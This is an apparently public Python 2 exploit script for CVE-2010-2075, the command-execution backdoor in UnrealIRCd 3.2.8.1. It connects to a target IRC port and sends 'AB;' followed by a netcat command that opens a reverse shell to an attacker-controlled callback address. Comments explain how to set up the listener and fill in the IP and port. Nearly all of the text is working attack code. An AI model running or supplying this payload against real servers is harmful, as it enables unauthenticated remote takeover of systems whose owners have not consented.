#!/usr/bin/python

#UnrealIRCD 3.2.8.1 Backdoor Command
#Connecting to port running above software and sending a system command with "AB;" in front will allow command to be executed. 
#Attacker does not need to be authenticated, can be remote. Commands are run as user who executed the server.  
#By: N0ur5
#Date: 1/8/19

#import modules needed for script
import socket
import sys

#Setting variables, host and ports are taken from first two arguents fed to script in-line (ie: ./CVE-2010-2075.py x.x.x.x 6667)
#cmd variable contains the payload/backdoor trigger "AB;" followed by a nc callback to the attackers machine
#run nc -lvp 8080 (8080 as example port) on an attacker controlled terminal
#replace <callbackIP> and <callbackPort> below by removing brackets and entering attacker IP and attacker port from step above
#Any other commands that are valid on the server and can be executed given level of privledge and can used intead if desired
host = sys.argv[1]
port = int(sys.argv[2])
cmd = "AB;nc -e /bin/sh <callbackIP> <callbackPort>"

#create function sendexpl which creates network socket, connects to host, sends payload, and recieves response 
def sendexpl():
        sockd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockd.connect((host,port))
        print sockd.recv(4096)
        sockd.sendall(cmd)
        print sockd.recv(4096)
sendexpl()

#will likely add functionality so script also catches the nc callback to simplfy getting a remote shell. 
